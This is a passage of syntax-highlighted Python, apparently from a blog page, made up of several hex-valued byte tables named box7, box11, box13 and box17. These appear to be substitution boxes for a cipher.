class="number">0xB5</span>, <span class="number">0x67</span>, <span class="number">0x1E</span>, <span class="number">0x85</span>, <span class="number">0x12</span>, <span class="number">0x68</span>, <span class="number">0x87</span>, <span class="number">0xD0</span>, <span class="number">0x30</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0x50</span>, <span class="number">0xCF</span>, <span class="number">0xEE</span>, <span class="number">0xDD</span>,</span><br><span class="line">        <span class="number">0xFB</span>, <span class="number">0xE6</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0x05</span>, <span class="number">0x75</span>, <span class="number">0xB7</span>, <span class="number">0xEF</span>, <span class="number">0x70</span>, <span class="number">0x53</span>, <span class="number">0xFF</span>, <span class="number">0xBA</span>, <span class="number">0x80</span>, <span class="number">0x41</span>, <span class="number">0x9B</span>, <span class="number">0xA1</span>, <span class="number">0x39</span>, <span class="number">0xF8</span>,</span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x51</span>, <span class="number">0x98</span>, <span class="number">0xAD</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x18</span>, <span class="number">0xC3</span>, <span class="number">0x31</span>, <span class="number">0x89</span>, <span class="number">0xCD</span>, <span class="number">0xCA</span>, <span class="number">0x91</span>, <span class="number">0xD1</span>, <span class="number">0x78</span>, <span class="number">0x57</span>,</span><br><span class="line">        <span class="number">0x47</span>, <span class="number">0xB8</span>, <span class="number">0x54</span>, <span class="number">0x9F</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x23</span>, <span class="number">0x2B</span>, <span class="number">0xE5</span>, <span class="number">0x46</span>, <span class="number">0x29</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x82</span>, <span class="number">0xBC</span>, <span class="number">0xFC</span>, <span class="number">0x6E</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="number">0xED</span>, <span class="number">0x64</span>, <span class="number">0x4A</span>, <span class="number">0x26</span>, <span class="number">0x34</span>, <span class="number">0x5C</span>, <span class="number">0x19</span>, <span class="number">0x55</span>, <span class="number">0xFD</span>, <span class="number">0x6D</span>, <span class="number">0xFA</span>, <span class="number">0x7E</span>, <span class="number">0xB2</span>, <span class="number">0xD4</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE4</span>, <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0xB0</span>, <span class="number">0x52</span>, <span class="number">0x9E</span>, <span class="number">0x8F</span>, <span class="number">0xBB</span>, <span class="number">0x08</span>, <span class="number">0x3B</span>, <span class="number">0x97</span>, <span class="number">0xE8</span>, <span class="number">0x10</span>, <span class="number">0x6C</span>, <span class="number">0x44</span>, <span class="number">0x3A</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x03</span>, <span class="number">0xC4</span>, <span class="number">0x81</span>,</span><br><span class="line">        <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xCB</span>, <span class="number">0x66</span>, <span class="number">0xAA</span>, <span class="number">0x37</span>, <span class="number">0xA2</span>, <span class="number">0xD2</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x7B</span>, <span class="number">0x14</span>, <span class="number">0x8D</span>, <span class="number">0xD9</span>, <span class="number">0xF5</span>, <span class="number">0x0B</span>, <span class="number">0xC2</span>, <span class="number">0x07</span>,</span><br><span class="line">        <span class="number">0xA8</span>, <span class="number">0x0D</span>, <span class="number">0xA3</span>, <span class="number">0x0A</span>, <span class="number">0x84</span>, <span class="number">0x6B</span>, <span class="number">0x2C</span>, <span class="number">0xEA</span>, <span class="number">0x0C</span>, <span class="number">0xAE</span>, <span class="number">0x7D</span>, <span class="number">0x6F</span>, <span class="number">0xD7</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x3C</span>, <span class="number">0x45</span>, <span class="number">0xCC</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0xB9</span>, <span class="number">0x3D</span>, <span class="number">0x33</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x8C</span>, <span class="number">0xCE</span>, <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x8B</span>, <span class="number">0x2D</span>, <span class="number">0x24</span>, <span class="number">0x11</span>, <span class="number">0xDF</span>, <span class="number">0x5A</span>, <span class="number">0x2E</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xDA</span>, <span class="number">0x86</span>, <span class="number">0x94</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x4F</span>, <span class="number">0x2A</span>, <span class="number">0xB3</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0xE3</span>, <span class="number">0xDE</span>, <span class="number">0x43</span>, <span class="number">0x1D</span>, <span class="number">0xBF</span>, <span class="number">0x15</span>, <span class="number">0x32</span>, <span class="number">0xBE</span>,</span><br><span class="line">        <span class="number">0x16</span>, <span class="number">0x3E</span>, <span class="number">0x93</span>, <span class="number">0x7F</span>, <span class="number">0x83</span>, <span class="number">0x56</span>, <span class="number">0x06</span>, <span class="number">0xF7</span>, <span class="number">0x8A</span>, <span class="number">0x20</span>, <span class="number">0xBD</span>, <span class="number">0x0E</span>, <span class="number">0xA6</span>, <span class="number">0xDB</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x42</span>, <span class="number">0xF0</span>,</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x4D</span>, <span class="number">0xA9</span>, <span class="number">0xF4</span>]</span><br><span class="line">box7 = [<span class="number">0x0F</span>, <span class="number">0xA5</span>, <span class="number">0xBA</span>, <span class="number">0x03</span>, <span class="number">0xF9</span>, <span class="number">0x69</span>, <span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0xFC</span>, <span class="number">0xA1</span>, <span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x25</span>, <span class="number">0xB2</span>,</span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0x51</span>, <span class="number">0x73</span>, <span class="number">0xEB</span>, <span class="number">0xCF</span>, <span class="number">0x13</span>, <span class="number">0xDE</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x38</span>, <span class="number">0x05</span>, <span class="number">0x09</span>, <span class="number">0xC2</span>, <span class="number">0x96</span>, <span class="number">0x1F</span>, <span class="number">0x7F</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x4A</span>, <span class="number">0xC9</span>, <span class="number">0xE7</span>, <span class="number">0x6A</span>, <span class="number">0xB0</span>, <span class="number">0x59</span>, <span class="number">0xF7</span>, <span class="number">0xD2</span>, <span class="number">0xB9</span>, <span class="number">0x16</span>, <span class="number">0xC8</span>, <span class="number">0xEE</span>, <span class="number">0xA9</span>, <span class="number">0x18</span>, <span class="number">0x80</span>, <span class="number">0xAC</span>, <span class="number">0xE3</span>,</span><br><span class="line">        <span class="number">0x9E</span>, <span class="number">0x6F</span>, <span class="number">0x3C</span>, <span class="number">0x2F</span>, <span class="number">0x3E</span>, <span class="number">0x9A</span>, <span class="number">0xBE</span>, <span class="number">0x1D</span>, <span class="number">0xB4</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0x32</span>, <span class="number">0x6B</span>, <span class="number">0x74</span>, <span class="number">0xC5</span>, <span class="number">0xC0</span>, <span class="number">0xC7</span>, <span class="number">0xD1</span>,</span><br><span class="line">        <span class="number">0x29</span>, <span class="number">0x98</span>, <span class="number">0xDD</span>, <span class="number">0xB6</span>, <span class="number">0x0E</span>, <span class="number">0x4D</span>, <span class="number">0xBF</span>, <span class="number">0x79</span>, <span class="number">0x0D</span>, <span class="number">0xDA</span>, <span class="number">0x7A</span>, <span class="number">0x17</span>, <span class="number">0x71</span>, <span class="number">0x43</span>, <span class="number">0x87</span>, <span class="number">0xFF</span>, <span class="number">0xDC</span>, <span class="number">0xC6</span>,</span><br><span class="line">        <span class="number">0x12</span>, <span class="number">0xE9</span>, <span class="number">0x67</span>, <span class="number">0x2D</span>, <span class="number">0x70</span>, <span class="number">0x9F</span>, <span class="number">0x95</span>, <span class="number">0x30</span>, <span class="number">0x26</span>, <span class="number">0x24</span>, <span class="number">0x2B</span>, <span class="number">0xA8</span>, <span class="number">0xA2</span>, <span class="number">0xD8</span>, <span class="number">0x3B</span>, <span class="number">0x31</span>, <span class="number">0xA0</span>, <span class="number">0x3D</span>,</span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x90</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x75</span>, <span class="number">0xE8</span>, <span class="number">0x5D</span>, <span class="number">0xF4</span>, <span class="number">0x85</span>, <span class="number">0xF3</span>, <span class="number">0xFE</span>, <span class="number">0x35</span>, <span class="number">0xCB</span>, <span class="number">0xB8</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0xB1</span>, <span class="number">0xF1</span>,</span><br><span class="line">        <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x21</span>, <span class="number">0xCD</span>, <span class="number">0xC4</span>, <span class="number">0x7E</span>, <span class="number">0xED</span>, <span class="number">0x07</span>, <span class="number">0xD9</span>, <span class="number">0xD6</span>, <span class="number">0x44</span>, <span class="number">0x15</span>, <span class="number">0x8E</span>, <span class="number">0x49</span>, <span class="number">0xB3</span>, <span class="number">0x97</span>, <span class="number">0xE6</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xEF</span>, <span class="number">0x3A</span>, <span class="number">0x8F</span>, <span class="number">0xF2</span>, <span class="number">0x53</span>, <span class="number">0x10</span>, <span class="number">0x77</span>, <span class="number">0x86</span>, <span class="number">0xF8</span>, <span class="number">0x8A</span>, <span class="number">0x28</span>, <span class="number">0x3F</span>, <span class="number">0xD4</span>, <span class="number">0x4C</span>, <span class="number">0xE5</span>, <span class="number">0x82</span>, <span class="number">0x83</span>,</span><br><span class="line">        <span class="number">0xEC</span>, <span class="number">0x62</span>, <span class="number">0x89</span>, <span class="number">0xDF</span>, <span class="number">0xC3</span>, <span class="number">0x14</span>, <span class="number">0xCA</span>, <span class="number">0xA3</span>, <span class="number">0x5F</span>, <span class="number">0x64</span>, <span class="number">0x47</span>, <span class="number">0xFD</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0x66</span>, <span class="number">0xA7</span>, <span class="number">0x5A</span>, <span class="number">0x0C</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0xD5</span>, <span class="number">0x5B</span>, <span class="number">0x0A</span>, <span class="number">0x4F</span>, <span class="number">0x27</span>, <span class="number">0x78</span>, <span class="number">0x0B</span>, <span class="number">0x2E</span>, <span class="number">0x48</span>, <span class="number">0x36</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0x56</span>, <span class="number">0xE0</span>, <span class="number">0xA6</span>, <span class="number">0xC1</span>, <span class="number">0x5C</span>,</span><br><span class="line">        <span class="number">0x8B</span>, <span class="number">0x41</span>, <span class="number">0x06</span>, <span class="number">0xBB</span>, <span class="number">0x52</span>, <span class="number">0x93</span>, <span class="number">0xAF</span>, <span class="number">0x2C</span>, <span class="number">0x5E</span>, <span class="number">0xF6</span>, <span class="number">0x61</span>, <span class="number">0xF0</span>, <span class="number">0xAB</span>, <span class="number">0x91</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0xBD</span>, <span class="number">0xCC</span>,</span><br><span class="line">        <span class="number">0xE4</span>, <span class="number">0x65</span>, <span class="number">0x9D</span>, <span class="number">0x92</span>, <span class="number">0xCE</span>, <span class="number">0x40</span>, <span class="number">0xAE</span>, <span class="number">0x76</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xAA</span>, <span class="number">0x54</span>, <span class="number">0xD0</span>, <span class="number">0x1C</span>, <span class="number">0x81</span>, <span class="number">0x4E</span>, <span class="number">0x57</span>, <span class="number">0x55</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0x6E</span>, <span class="number">0x1E</span>, <span class="number">0x99</span>, <span class="number">0xDB</span>, <span class="number">0xFB</span>, <span class="number">0xA4</span>, <span class="number">0x22</span>, <span class="number">0x19</span>, <span class="number">0x58</span>, <span class="number">0x11</span>, <span class="number">0x8D</span>, <span class="number">0x94</span>, <span class="number">0xD3</span>, <span class="number">0xE2</span>, <span class="number">0x8C</span>, <span class="number">0xF5</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0xBC</span>, <span class="number">0x33</span>, <span class="number">0xE1</span>]</span><br><span class="line">box11 = [<span class="number">0x38</span>, <span class="number">0xD9</span>, <span class="number">0xDA</span>, <span class="number">0xE6</span>, <span class="number">0xB5</span>, <span class="number">0xF1</span>, <span class="number">0x0B</span>, <span class="number">0x93</span>, <span class="number">0x0C</span>, <span class="number">0x58</span>, <span class="number">0x0D</span>, <span class="number">0xAE</span>, <span class="number">0x0A</span>, <span class="number">0x85</span>, <span class="number">0x2A</span>, <span class="number">0x50</span>, <span class="number">0xC2</span>, <span class="number">0xBF</span>,</span><br><span class="line">         <span class="number">0xD4</span>, <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0xC4</span>, <span class="number">0x4F</span>, <span class="number">0xE1</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0xA2</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x65</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x9D</span>, <span class="number">0x5F</span>, <span class="number">0x05</span>, <span class="number">0x7C</span>,</span><br><span class="line">         <span class="number">0xF7</span>, <span class="number">0xD7</span>, <span class="number">0x99</span>, <span class="number">0x8B</span>, <span class="number">0xCC</span>, <span class="number">0xCE</span>, <span class="number">0x16</span>, <span class="number">0xBE</span>, <span class="number">0xB6</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0x79</span>, <span class="number">0xC7</span>, <span class="number">0x20</span>, <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0x2E</span>,</span><br><span class="line">         <span class="number">0x4A</span>, <span class="number">0x89</span>, <span class="number">0xD6</span>, <span class="number">0x0F</span>, <span class="number">0x6E</span>, <span class="number">0xB0</span>, <span class="number">0x61</span>, <span class="number">0xB1</span>, <span class="number">0x6D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x03</span>, <span class="number">0x74</span>, <span class="number">0xA1</span>, <span class="number">0x40</span>, <span class="number">0xEC</span>, <span class="number">0xC0</span>, <span class="number">0x57</span>,</span><br><span class="line">         <span class="number">0x94</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0xD5</span>, <span class="number">0xEA</span>, <span class="number">0x17</span>, <span class="number">0x6A</span>, <span class="number">0x84</span>, <span class="number">0x37</span>, <span class="number">0xED</span>, <span class="number">0xF6</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x5B</span>, <span class="number">0x82</span>, <span class="number">0x1E</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>,</span><br><span class="line">         <span class="number">0xE2</span>, <span class="number">0x42</span>, <span class="number">0x86</span>, <span class="number">0xBA</span>, <span class="number">0xE3</span>, <span class="number">0x91</span>, <span class="number">0x7F</span>, <span class="number">0x67</span>, <span class="number">0x5C</span>, <span class="number">0x98</span>, <span class="number">0x15</span>, <span class="number">0x22</span>, <span class="number">0x8D</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x09</span>,</span><br><span class="line">         <span class="number">0xA0</span>, <span class="number">0xAD</span>, <span class="number">0x63</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0x9A</span>, <span class="number">0x3C</span>, <span class="number">0xA3</span>, <span class="number">0x3A</span>, <span class="number">0x69</span>, <span class="number">0xF8</span>, <span class="number">0xCD</span>, <span class="number">0xBC</span>, <span class="number">0x88</span>, <span class="number">0x55</span>, <span class="number">0xB2</span>, <span class="number">0xBD</span>, <span class="number">0x6B</span>,</span><br><span class="line">         <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0xB3</span>, <span class="number">0xD3</span>, <span class="number">0x90</span>, <span class="number">0x75</span>, <span class="number">0x06</span>, <span class="number">0x49</span>, <span class="number">0xC3</span>, <span class="number">0x32</span>, <span class="number">0x4D</span>, <span class="number">0x1D</span>, <span class="number">0xA8</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0x2B</span>,</span><br><span class="line">         <span class="number">0xA6</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0x2F</span>, <span class="number">0x9C</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x8C</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x87</span>, <span class="number">0xD1</span>, <span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0x18</span>,</span><br><span class="line">         <span class="number">0x51</span>, <span class="number">0x23</span>, <span class="number">0xCB</span>, <span class="number">0xF5</span>, <span class="number">0x1C</span>, <span class="number">0x9F</span>, <span class="number">0x97</span>, <span class="number">0xF9</span>, <span class="number">0xBB</span>, <span class="number">0xA7</span>, <span class="number">0x39</span>, <span class="number">0x45</span>, <span class="number">0x02</span>, <span class="number">0xFD</span>, <span class="number">0x46</span>, <span class="number">0x8A</span>, <span class="number">0x54</span>, <span class="number">0xA4</span>,</span><br><span class="line">         <span class="number">0x8E</span>, <span class="number">0x9E</span>, <span class="number">0x68</span>, <span class="number">0x96</span>, <span class="number">0x0E</span>, <span class="number">0x78</span>, <span class="number">0xB8</span>, <span class="number">0x3D</span>, <span class="number">0x11</span>, <span class="number">0x64</span>, <span class="number">0xAF</span>, <span class="number">0x10</span>, <span class="number">0xDE</span>, <span class="number">0x6C</span>, <span class="number">0x60</span>, <span class="number">0x5A</span>, <span class="number">0x76</span>, <span class="number">0x1A</span>,</span><br><span class="line">         <span class="number">0xE9</span>, <span class="number">0xC1</span>, <span class="number">0x3E</span>, <span class="number">0xCA</span>, <span class="number">0x9B</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0xEF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0xD2</span>, <span class="number">0xB9</span>, <span class="number">0x2D</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0x83</span>, <span class="number">0xAB</span>, <span class="number">0xF2</span>,</span><br><span class="line">         <span class="number">0x4C</span>, <span class="number">0xA5</span>, <span class="number">0x21</span>, <span class="number">0x62</span>, <span class="number">0x81</span>, <span class="number">0x33</span>, <span class="number">0x1B</span>, <span class="number">0xD8</span>, <span class="number">0x6F</span>, <span class="number">0xAC</span>, <span class="number">0x3B</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xFA</span>, <span class="number">0x3F</span>, <span class="number">0xDB</span>, <span class="number">0x95</span>, <span class="number">0xE7</span>,</span><br><span class="line">         <span class="number">0x59</span>, <span class="number">0x12</span>, <span class="number">0x48</span>, <span class="number">0x35</span>, <span class="number">0xC6</span>, <span class="number">0x2C</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0xDD</span>, <span class="number">0x43</span>, <span class="number">0x29</span>, <span class="number">0xDC</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0xB7</span>, <span class="number">0xA9</span>, <span class="number">0xEB</span>, <span class="number">0xC8</span>,</span><br><span class="line">         <span class="number">0xFE</span>, <span class="number">0x56</span>, <span class="number">0xDF</span>, <span class="number">0x53</span>]</span><br><span class="line">box13 = [<span class="number">0xB0</span>, <span class="number">0x28</span>, <span class="number">0x0B</span>, <span class="number">0x89</span>, <span class="number">0x4B</span>, <span class="number">0xA4</span>, <span class="number">0xBE</span>, <span class="number">0x1A</span>, <span class="number">0x8F</span>, <span class="number">0x6C</span>, <span class="number">0xCF</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xFE</span>, <span class="number">0xFB</span>, <span class="number">0x59</span>, <span class="number">0x2D</span>, <span class="number">0x29</span>,</span><br><span class="line">         <span class="number">0x39</span>, <span class="number">0x62</span>, <span class="number">0x97</span>, <span class="number">0xAA</span>, <span class="number">0xD7</span>, <span class="number">0x7D</span>, <span class="number">0x94</span>, <span class="number">0x2C</span>, <span class="number">0xFC</span>, <span class="number">0x5D</span>, <span class="number">0xB4</span>, <span class="number">0x7C</span>, <span class="number">0x8A</span>, <span class="number">0x82</span>, <span class="number">0xD3</span>, <span class="number">0xA7</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>,</span><br><span class="line">         <span class="number">0x21</span>, <span class="number">0xE6</span>, <span class="number">0xA2</span>, <span class="number">0xD0</span>, <span class="number">0xE8</span>, <span class="number">0xF0</span>, <span class="number">0x67</span>, <span class="number">0x3A</span>, <span class="number">0xB9</span>, <span class="number">0x98</span>, <span class="number">0xF9</span>, <span class="number">0xAE</span>, <span class="number">0xD1</span>, <span class="number">0x56</span>, <span class="number">0xD8</span>, <span class="number">0xCA</span>, <span class="number">0x10</span>, <span class="number">0xEA</span>,</span><br><span class="line">         <span class="number">0x92</span>, <span class="number">0xA8</span>, <span class="number">0x75</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xA9</span>, <span class="number">0xAF</span>, <span class="number">0x51</span>, <span class="number">0xC9</span>, <span class="number">0x8E</span>, <span class="number">0xD4</span>, <span class="number">0x77</span>, <span class="number">0xE4</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x61</span>, <span class="number">0x9E</span>, <span class="number">0x24</span>,</span><br><span class="line">         <span class="number">0xD9</span>, <span class="number">0x9B</span>, <span class="number">0x11</span>, <span class="number">0x05</span>, <span class="number">0x1D</span>, <span class="number">0x96</span>, <span class="number">0x9A</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xCD</span>, <span class="number">0xF3</span>, <span class="number">0x38</span>, <span class="number">0xB3</span>, <span class="number">0x57</span>, <span class="number">0x50</span>,</span><br><span class="line">         <span class="number">0xF4</span>, <span class="number">0xAC</span>, <span class="number">0xEB</span>, <span class="number">0x14</span>, <span class="number">0xA5</span>, <span class="number">0x46</span>, <span class="number">0xF6</span>, <span class="number">0x93</span>, <span class="number">0xAD</span>, <span class="number">0x7B</span>, <span class="number">0x30</span>, <span class="number">0xEF</span>, <span class="number">0x79</span>, <span class="number">0x17</span>, <span class="number">0x47</span>, <span class="number">0xDA</span>, <span class="number">0xC0</span>, <span class="number">0xDD</span>,</span><br><span class="line">         <span class="number">0xDE</span>, <span class="number">0xDC</span>, <span class="number">0x5A</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x31</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x86</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xFA</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xA3</span>, <span class="number">0xBF</span>, <span class="number">0x64</span>, <span class="number">0x37</span>,</span><br><span class="line">         <span class="number">0x22</span>, <span class="number">0xD2</span>, <span class="number">0x69</span>, <span class="number">0x5C</span>, <span class="number">0xC6</span>, <span class="number">0x16</span>, <span class="number">0x9F</span>, <span class="number">0x5E</span>, <span class="number">0x7A</span>, <span class="number">0x1E</span>, <span class="number">0x27</span>, <span class="number">0x60</span>, <span class="number">0x6E</span>, <span class="number">0xF8</span>, <span class="number">0x8C</span>, <span class="number">0xEE</span>, <span class="number">0xC2</span>, <span class="number">0x74</span>,</span><br><span class="line">         <span class="number">0x81</span>, <span class="number">0x8B</span>, <span class="number">0x33</span>, <span class="number">0x03</span>, <span class="number">0xBD</span>, <span class="number">0x2A</span>, <span class="number">0x0A</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xC3</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x3D</span>, <span class="number">0x63</span>, <span class="number">0xF5</span>, <span class="number">0xAB</span>,</span><br><span class="line">         <span class="number">0xCC</span>, <span class="number">0x3C</span>, <span class="number">0x53</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0xC4</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0xE7</span>, <span class="number">0x25</span>, <span class="number">0x55</span>, <span class="number">0xC7</span>, <span class="number">0xED</span>, <span class="number">0xB7</span>, <span class="number">0xBC</span>, <span class="number">0xCB</span>, <span class="number">0x8D</span>, <span class="number">0x09</span>,</span><br><span class="line">         <span class="number">0xCE</span>, <span class="number">0x52</span>, <span class="number">0xBB</span>, <span class="number">0xE2</span>, <span class="number">0xC5</span>, <span class="number">0xB6</span>, <span class="number">0x26</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x99</span>, <span class="number">0x58</span>, <span class="number">0x40</span>, <span class="number">0x6D</span>, <span class="number">0xA1</span>, <span class="number">0x3E</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xA6</span>,</span><br><span class="line">         <span class="number">0xF2</span>, <span class="number">0x0F</span>, <span class="number">0x43</span>, <span class="number">0x78</span>, <span class="number">0xB8</span>, <span class="number">0x01</span>, <span class="number">0xE5</span>, <span class="number">0xD5</span>, <span class="number">0x6F</span>, <span class="number">0x4E</span>, <span class="number">0xF7</span>, <span class="number">0x13</span>, <span class="number">0x42</span>, <span class="number">0xEC</span>, <span class="number">0x45</span>, <span class="number">0x2B</span>, <span class="number">0x4F</span>, <span class="number">0x36</span>,</span><br><span class="line">         <span class="number">0xDB</span>, <span class="number">0x9C</span>, <span class="number">0xE3</span>, <span class="number">0x44</span>, <span class="number">0x34</span>, <span class="number">0x84</span>, <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0x7F</span>, <span class="number">0xFD</span>, <span class="number">0x91</span>, <span class="number">0x41</span>, <span class="number">0xD6</span>, <span class="number">0x95</span>, <span class="number">0x18</span>, <span class="number">0xFF</span>, <span class="number">0x70</span>, <span class="number">0xC8</span>,</span><br><span class="line">         <span class="number">0x02</span>, <span class="number">0x5F</span>, <span class="number">0x08</span>, <span class="number">0x1B</span>, <span class="number">0x6A</span>, <span class="number">0x5B</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x4D</span>, <span class="number">0x35</span>, <span class="number">0x54</span>, <span class="number">0xE9</span>, <span class="number">0x32</span>, <span class="number">0x88</span>, <span class="number">0x72</span>, <span class="number">0x07</span>, <span class="number">0x87</span>, <span class="number">0x90</span>,</span><br><span class="line">         <span class="number">0x4A</span>, <span class="number">0x80</span>, <span class="number">0x1F</span>, <span class="number">0x9D</span>]</span><br><span class="line">box17 = [<span class="number">0xE8</span>, <span class="number">0x22</span>, <span class="number">0x64</span>, <span class="number">0x9F</span>, <span class="number">0xC5</span>, <span class="number">0xD5</span>, <span class="number">0x25</span>, <span class="number">0xC9</span>, <span class="number">0x5D</span>, <span class="number">0xDF</span>, <span class="number">0xA1</span>, <span class="number">0x74</span>, <span class="number">0xCB</span>, <span class="number">0x57</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xBD</span>, <span class="number">0x56</span>,</span><br><span class="line">         <span class="number">0xFF</span>, <span class="number">0x33</span>, <span class="number">0x79</span>, <span class="number">0xFE</span>, <span class="number">0x87</span>, <span class="number">0xB6</span>, <span class="number">0xB1</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x95</span>, <span class="number">0x8A</span>, <span class="number">0xEC</span>, <span class="number">0x7B</span>, <span class="number">0x48</span>, <span class="number">0x84</span>, <span class="number">0x3D</span>, <span class="number">0x30</span>, <span class="number">0xEF</span>,</span><br><span class="line">         <span class="number">0x86</span>, <span class="number">0xFA</span>, <span class="number">0x97</span>, <span class="number">0x1C</span>, <span class="number">0xDC</span>, <span class="number">0xA9</span>, <span class="number">0x5A</span>, <span class="number">0xF3</span>, <span class="number">0x67</span>, <span class="number">0x18</span>, <span class="number">0x83</span>, <span class="number">0x72</span>, <span class="number">0x06</span>, <span class="number">0xB9</span>, <span class="number">0xF5</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x59</span>,</span><br><span class="line">         <span class="number">0xF2</span>, <span class="number">0xE4</span>, <span class="number">0x88</span>, <span class="number">0x5E</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xDE</span>, <span class="number">0xEB</span>, <span class="number">0x7D</span>, <span class="number">0x62</span>, <span class="number">0x9B</span>, <span class="number">0xD6</span>, <span class="number">0xF4</span>, <span class="number">0x01</span>, <span class="number">0x29</span>,</span><br><span class="line">         <span class="number">0xBC</span>, <span class="number">0xC0</span>, <span class="number">0x69</span>, <span class="number">0xA2</span>, <span class="number">0x2B</span>, <span class="number">0x0D</span>, <span class="number">0x1D</span>, <span class="number">0x98</span>, <span class="number">0x6A</span>, <span class="number">0xBE</span>, <span class="number">0x65</span>, <span class="number">0x09</span>, <span class="number">0xF8</span>, <span 